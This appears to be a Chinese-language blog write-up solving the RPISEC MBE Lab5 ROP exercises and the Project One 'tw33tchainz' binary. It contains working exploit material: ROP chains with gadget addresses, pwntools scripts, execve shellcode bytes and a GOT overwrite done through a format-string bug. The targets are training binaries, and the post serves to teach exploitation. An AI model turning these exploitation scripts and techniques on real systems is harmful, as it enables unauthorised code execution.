---
layout: post
title: "MBE Lab5 and Project One Write Up"
---

# 0x00 背景

此篇write up对应于MBE的[Lab5](https://github.com/RPISEC/MBE/tree/master/src/lab05)和[Project One](http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/14/ProjectOneRubric.pdf)，ROP的道理比较简单，需要会使用`ropsearch`等工具，后者则为pwn小题目，借机实践了一把GOT/PLT Overwrites。

<!-- more -->

# 0x01 Lab5 ROP

## lab5C

此题动态链接，而且点名是ret2libc，未开启栈保护所以直接溢出覆盖返回地址为system地址，借助gdb-peda的功能得到偏移为156字节：

```
gdb-peda$ pattern create 2000 input
Writing pattern of 2000 chars to filename "input"
gdb-peda$ r < input 
Starting program: /home/larry/MBE/src/lab05/lab5C < input
…
gdb-peda$ pattern offset 0x71414154
1900101972 found at offset: 156
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e55310 <__libc_system>
```

加上4字节的padding，还缺一个`/bin/sh`字符串指针的地址。由于源码中会把我们输入的字符串保存到全局变量global_str中，所以查看符号表可得到其虚拟地址，成功ROP：

![][1] 

## Lab5B

同理可以得到pattern offset为140，但是为静态链接，需要我们手动构造基础的ROP Chain，也就是要找到符合shellcode的gadget。shellcode那肯定是要用系统调用了，主要的问题还是`/bin/sh`字符串指针的问题，在ROP过程中弹给ebx我做不到，就默认还是可以本地得到的。方法就是产生core dump之后gdb调试分析即可：

![][2]

还有一个问题是binary中找不到`mov ecx, eax`、`move dx, eax`这样的gadget，但可以使用pop ret来弹出0x00000000，具体如下：

```
/bin/sh
padding
pop ebx; ret
0xbfffefe0
xor eax, eax; ret
pop exc; ret
0x00000000
pop edx; ret
0x00000000
inc eax; ret
#repeat 9 times
inc eax; ret
int 0x80
```

即可轻松完成：

![][3]

## Lab5A

此题似曾相识，read_number可以实现任意地址读，store_number虽然现实了index不能大于100，但index为int类型，输入为负数照样可以实现任意地址写。静态编译还是需要自己构造ROP Chain。

因为写地址的过程会多次调用函数，栈上的一些地址可能被覆盖改变，所以最终调转至data数组中的地址去ROP比较保险。调试可知store的栈上ret的地址和data+1相差44字节，返回地址覆盖为`add esp 44; ret`即可。

还是需要面对ebx的问题，要知道data的地址，通过调试可知read_number参数地址和data地址相差-40，index为-10即可泄露：

![][4]

ROP Chain的构造思路和上一题类似，脚本如下：

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

# pop ebx; pop esi; ret
# 0xbfxxxxxx
# 0x00000000
# xor eax, eax; ret
# pop ecx; ret
# 0x00000000
# inc eax; ret 
# pop edx; ret
# 0x00000000

rop = {"1": "0x0805c003", "2": "0xbfffef54", \
       "4": "0x08055620", "5": "0x080e5d41", \
       "7": "0x080e8cf3", "8": "0x0806f38a"}

# inc eax; ret
# pop edi; ret
# 0x00000000

i = 9
for _ in xrange(10):
    rop[str(i+1)] = "0x080e8cf3"
    rop[str(i+2)] = "0x08066202"
    i += 3

# int 0x80; ret

rop["40"] = "0x0806fa60"

# /bin//sh

rop["43"] = "0x6e69622f"
rop["44"] = "0x68732f2f"

exp = ""
for k, v in rop.items():
    exp += "store\n%s\n%s\n" % (str(int(v, 16)), str(k))

# add esp 44; ret

exp += "store\n%s\n%s\n" % (str(int("0x08048b1e", 16)), str("-11"))

print repr(exp)
```

利用效果如下：

![][5]

# 0x02 Project One

## 功能概述

此课题直接给了一个可运行的二进制程序，IDA F5之后即可知道大致逻辑，其为一个类似发tweet的小程序：

1. 初始化：会要求输入账号，盐值，结合生成的随机数自己实现了一个算法给你password，相当于注册功能。
2. 发推：堆上申请24字节空间，前16字节fgets得到，紧接着4字节存储下条推文的起始地址，形成单向链表。
3. 看推：根据存储的全局变量链表头，循环输出查看所有的推文。
4. 鉴权：验证是否为管理员权限，设置相应的全局变量，并具有额外的功能可使用。

## 管理员认证

通过maybe_admin函数，判断输入的密码和之前用于生成密码的随机数是否相同，相同则认证成功。但是程序自己设计的hash算法很简单：

![][6]

其中user和salt都已知，secretpass很轻松就可以算出来了，但需要注意三个坑点：

1. 根据代码逻辑接收输入都为`fgets(xxx, 16, stdin`，当小于16字节时字符串尾部会带上`\x0a\x00`+padding。
2. 用户的password是`%08x%08x%08x%08x\n`这样printf出来的，由于大小端问题还是需要逆序处理数据。
3. 字符运算过程中进位问题取模一下就好。

因为要求自动化，这程序的输入输出也有点乱，就用pwntools就可以了（代码有些丑）：

```python
#!/usr/bin/env python

from pwn import *

input_username = 'larry'
input_salt = 'xi'

def get_secretpass(password):
    username = input_username + '\x0a\x00' + chr(204)*9
    salt = input_salt + '\x0a\x00' + chr(186)*12
    passwd = ''
    for i in xrange(0, 32, 2):
        passwd += chr(int('0x'+password[i:i+2], 16))
    rpass = ''
    for i in xrange(0, 16, 4):
        rpass += passwd[i:i+4][::-1]
    secret = ''
    for i in xrange(16):
        secret += chr(((ord(rpass[i]) ^ ord(username[i])) - ord(salt[i]))%256)

    return secret

#context.log_level = 'debug'
p = process('./tw33tchainz')
p.recvline_contains('Username')
p.sendline(input_username)
p.recvline_contains('Salt')
p.sendline(input_salt)
p.recvline_contains('Password')
password = p.recvline(keepends = False)
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('3')
p.recvuntil('password: ')
secret = get_secretpass(password)
p.sendline(secret)
print p.recvline()
```

## Pwn

认证完下面一个任务就是直接要求pwn，有点蒙就先来看看checksec：

![][7]

有个漏洞就随便打的节奏，程序不算多可以找到漏洞点为一个字符串格式化漏洞：

![][8]

而且还在栈上有拷贝的内容，也就意味着通过这个字符串格式化漏洞可以实现任意地址读写。我们的shellcode只能放到推文中，也就是堆上的地址，而且是16个字节的单向链表，限制条件有点多，直接从栈上读取tweet_tail的地址有些繁琐，更简单的是在print_tweet函数中有为管理员输出链表地址的调试信息，稍加利用即可：

![][9]

那么写地址呢，把eip劫持到哪里呢，为了方便这里就使用覆盖GOT的方法，因为GOT的地址我们是可以通过readelf直接得到的，每一次printf写的payload限制为16字节，所以一次写一个字节刚刚好，覆盖`exit@got.plt`为shellcode起始地址就可以了。

最后一个问题就是shellcode布局，最短的我也要23字节，超过了一条推文的长度，因为任何推文的地址都可以得到，所以分成两段即可：

```
part1_addr: xor eax, eax; push eax; push 0x68732f2f; push part2_addr; ret
part2_addr: push 0x6e69622f; mov ebx, esp; mov ecx, eax; mov edx, eax; mov eax, edx; int 0x80
```

pwntools汇总如下，exp中需要注意的小问题详见代码：

```python
#0x0804d03c
#context.log_level = 'debug'
shellcode_part1 = "\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
shellcode_part2 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('1')
p.recvuntil('bytes): ')
p.sendline(shellcode_part1)
p.recv()
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('6')
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('2')
part1_addr = p.recvregex('Address: 0x(.{8})').strip()[-10:]
shellcode_part2 += "\x68" + p32(int(part1_addr, 16)) + "\xc3\x90" 
p.recv()
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('1')
p.recvuntil('bytes): ')
p.sendline(shellcode_part2)
p.recv()
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('2')
part2_addr = p.recvregex('Next: 0x(.{8})').strip()[-10:]
p.recv()
part2_addr = p32(int(part2_addr, 16))
for i in xrange(4):
    if ord(part2_addr[i]) < 5:
        padding = 0x100+ord(part2_addr[i])-5
    else:
        padding = ord(part2_addr[i])-5
    fmtstr = "\x90"+chr(ord("\x3c")+i)+"\xd0\x04\x08%"+str(padding)+"c%8$hhn"
    p.sendline(' ')
    p.recvuntil('Choice: ')
    p.sendline('1')
    p.recvuntil('bytes): ')
    p.sendline(fmtstr)
    #p.recv()

print repr(part1_addr)
print repr(part2_addr)
#gdb.attach(p)
p.sendline(' ')
p.recvuntil('Choice: ')
p.sendline('5')
p.interactive()
```

getshell如下图，因为有地址泄露，所以有ASLR也不是问题：

![][10]

# 0x03 总结

ROP对应的课程感觉有点少，更详细的可参看蒸米的[文章](http://cb.drops.wiki/drops/tips-6597.html)。总是拿printf搞事情虽然有些无聊，但用下pwntools也好，有明确的信息让我们去了解学习是最好的事情了，多写多调也才是坚持之道。


[1]: https://wx2.sinaimg.cn/large/ee2fecafly1fpbl8c7x50j20k6053dgl.jpg
[2]: https://wx1.sinaimg.cn/large/ee2fecafly1fpbl8daxttj20k40a20tv.jpg
[3]: https://wx1.sinaimg.cn/large/ee2fecafly1fpbl8e2x3dj20k104nq3g.jpg
[4]: https://wx4.sinaimg.cn/large/ee2fecafly1fpbl8f79unj20k104hjri.jpg
[5]: https://wx3.sinaimg.cn/large/ee2fecafly1fpbl8gmrlqj20k105gq3i.jpg
[6]: https://wx1.sinaimg.cn/large/ee2fecafly1fpbl8hjp4zj20py08jq3g.jpg
[7]: https://wx2.sinaimg.cn/large/ee2fecafly1fpbl8i9zycj20i30410t3.jpg
[8]: https://wx4.sinaimg.cn/large/ee2fecafly1fpbl8jbdu4j20kd09dwem.jpg
[9]: https://wx4.sinaimg.cn/large/ee2fecafly1fpbl8l9yv1j20iu05ct8p.jpg
[10]: https://wx1.sinaimg.cn/large/ee2fecafly1fpbl8m2y7sj20le093aao.jpg
